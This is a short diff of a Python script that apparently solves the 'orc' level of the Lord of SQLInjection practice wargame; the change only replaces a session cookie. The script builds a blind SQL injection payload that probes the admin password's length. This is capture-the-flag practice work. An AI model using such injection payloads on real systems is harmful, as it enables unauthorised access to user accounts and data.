@@ -1,6 +1,6 @@
 import requests
 url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
-header={"Cookie":"PHPSESSID=3rrijviseh2kgti5bc5st8ov7u"}
+header={"Cookie":"PHPSESSID=tflt7ovdj4end88efrj3foarmt"}
 sess=requests.session()
 
 payload="?pw=' or id='admin' and length(pw)="
